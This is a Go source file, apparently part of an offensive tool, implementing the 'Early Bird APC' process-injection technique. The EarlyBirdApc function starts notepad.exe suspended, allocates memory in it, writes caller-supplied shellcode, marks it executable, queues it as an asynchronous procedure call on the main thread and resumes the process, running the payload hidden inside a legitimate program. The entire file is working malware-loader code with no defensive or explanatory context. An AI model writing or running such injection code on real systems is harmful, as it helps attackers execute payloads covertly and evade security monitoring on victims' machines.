package core

import (
  "unsafe"
  "syscall"
  "fmt"
  "errors"

  // Internal
  "golang.org/x/sys/windows"
)

func EarlyBirdApc(shellcode []byte, pid int) (error){
  kernel32 := windows.NewLazySystemDLL("kernel32.dll")
  VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
  VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
  WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
  QueueUserAPC := kernel32.NewProc("QueueUserAPC")

  procInfo := &windows.ProcessInformation{}
  startupInfo := &windows.StartupInfo{
    Flags: windows.CREATE_SUSPENDED,
  }

  errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe"), syscall.StringToUTF16Ptr(""), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
  if errCreateProcess != nil {
    return errors.New(fmt.Sprintf("[!] Error calling CreateProcess: %v", errCreateProcess.Error()))
  }

  addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

  if addr == 0 {
    return errors.New("[!] VirtualAllocEx failed and returned 0")
  }

  WriteProcessMemory.Call(uintptr(procInfo.Process), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

  oldProtect := windows.PAGE_READWRITE
  VirtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

  QueueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)

  _, errResumeThread := windows.ResumeThread(procInfo.Thread)
  if errResumeThread != nil {
    return errors.New(fmt.Sprintf("[!] Error calling ResumeThread: %v", errResumeThread.Error()))
  }

  errCloseProcHandle := windows.CloseHandle(procInfo.Process)
  if errCloseProcHandle != nil {
    return errCloseProcHandle
  }

  errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
  if errCloseThreadHandle != nil {
    return errCloseThreadHandle
  }

  return nil
}


